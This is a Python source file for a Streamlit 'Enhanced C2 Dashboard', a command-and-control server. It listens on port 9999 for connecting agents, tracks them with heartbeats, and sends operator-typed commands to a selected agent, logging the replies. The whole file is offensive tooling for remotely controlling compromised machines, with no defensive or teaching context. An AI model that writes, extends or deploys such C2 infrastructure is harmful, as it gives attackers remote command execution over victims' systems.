import streamlit as st
import socket
import threading
import time
from queue import Queue

# Initialize Streamlit configuration
st.set_page_config(layout="wide", page_title="Enhanced C2 Dashboard")

# Sidebar - App title
st.sidebar.title("Enhanced Command & Control (C2) Dashboard")

# Columns Layout
col1, col2 = st.columns([1, 2])

# Thread-safe storage for connected agents
targets = Queue()
heartbeat_interval = 10  # Time interval in seconds for agent heartbeats

# Function to start the server and listen for connections
def start_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen()
    st.session_state['logs'] += "\n[INFO] Server listening on {}:{}...".format(host, port)
    while True:
        client, address = server.accept()
        targets.put((client, address))
        st.session_state['logs'] += f"\n[+] Connection established from {address}"
        # Start a new thread for heartbeat monitoring
        threading.Thread(target=agent_heartbeat, args=(client, address), daemon=True).start()

# Heartbeat function to monitor if agents are still connected
def agent_heartbeat(client, address):
    try:
        while True:
            client.send(b"heartbeat")
            time.sleep(heartbeat_interval)
    except:
        st.session_state['logs'] += f"\n[-] Lost connection with {address}"
        remove_agent(client, address)

# Function to remove disconnected agent
def remove_agent(client, address):
    with targets.mutex:
        targets.queue = [t for t in list(targets.queue) if t[0] != client]
    client.close()

# Start server in a separate thread
if 'logs' not in st.session_state:
    st.session_state['logs'] = "[INFO] Initializing Enhanced C2 Server..."
    threading.Thread(target=start_server, args=("0.0.0.0", 9999), daemon=True).start()

# Column 1 - Connected Agents
with col1:
    st.subheader("Connected Agents")
    if not targets.empty():
        for i, target in enumerate(list(targets.queue)):
            st.write(f"Agent {i+1}: {target[1]}")
    else:
        st.write("No agents connected.")

# Column 2 - Command Execution
with col2:
    st.subheader("Command Execution")
    agent_list = [f"Agent {i+1}" for i in range(len(list(targets.queue)))]
    selected_agent = st.selectbox("Select Agent", options=agent_list)
    command = st.text_input("Enter Command to Execute")
    if st.button("Send Command"):
        agent_index = int(selected_agent.split()[1]) - 1
        client_socket = list(targets.queue)[agent_index][0]
        try:
            client_socket.send(command.encode())
            st.session_state['logs'] += f"\n[+] Sent command to {list(targets.queue)[agent_index][1]}: {command}"
            # Read response (blocking call until response received)
            response = client_socket.recv(1024).decode()
            st.session_state['logs'] += f"\n[+] Response from {list(targets.queue)[agent_index][1]}: {response}"
        except Exception as e:
            st.session_state['logs'] += f"\n[ERROR] Failed to send command: {str(e)}"

# Display Logs with Refresh
st.subheader("Logs")
st.text_area("Logs", st.session_state['logs'], height=300)
st.experimental_rerun()
